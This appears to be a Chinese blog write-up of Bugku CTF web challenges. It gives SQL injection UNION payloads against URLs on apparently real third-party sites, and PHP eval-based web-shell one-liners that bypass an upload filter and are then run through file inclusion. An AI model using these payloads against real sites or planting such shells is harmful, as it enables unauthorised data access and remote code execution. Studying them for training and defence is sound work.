---
title: bugku_web
date: 2019-03-12 15:38:18
tags:
    - CTF
categories:
    - CTF
    - writeup
---
## 实战1-注入
```bash
payload:http://www.interplay.com/games/support.php?id=-41 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,table_name,18,19 from information_schema.tables where table_schema=database()#
```
## 实战2-注入
```bash
payload:http://www.kabelindo.co.id/readnews.php?id=-18 UNION SELECT 1,table
_name,3,4,5 from information_schema.tables where table_schema=database()%23
```
<!--more-->
## phpcmsV9
robots.txt 直接爆flag(估计是本题的bug)
## 文件包含2

首先进入界面，F12发现了源码中有upload.php而且./upload/可读，猛一看像是文件上传，但是题目的提示是文件包含啊！而且在Network中找到了这个

![xx](http://upload-images.jianshu.io/upload_images/4838174-7e1ff8e60d6b7a26?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
哪个tip转义过来就是`include.php`那我们就按照文件包含去尝试一下
结果尝试了一堆方法光是返回NAIVE!!!….回归上传的思路吧…
上传图片小马（事实上并没有进行MIME检验，直接替换内容即可）
发现过滤了`<?php` 和`?>`,这里给出两种绕过方法

```php
<?=@eval($_POST['cmd']);
<script language="php">eval($_POST['cmd']);</script>
```

![xx](http://upload-images.jianshu.io/upload_images/4838174-d7a67bba0c225305?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

嗯，然后再upload.php中是不能以php运行的，所以需要再include.php(index.php)中的file变量来包含upload目录下的图片文件！

![xx](http://upload-images.jianshu.io/upload_images/4838174-2e4d866b636461ff?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


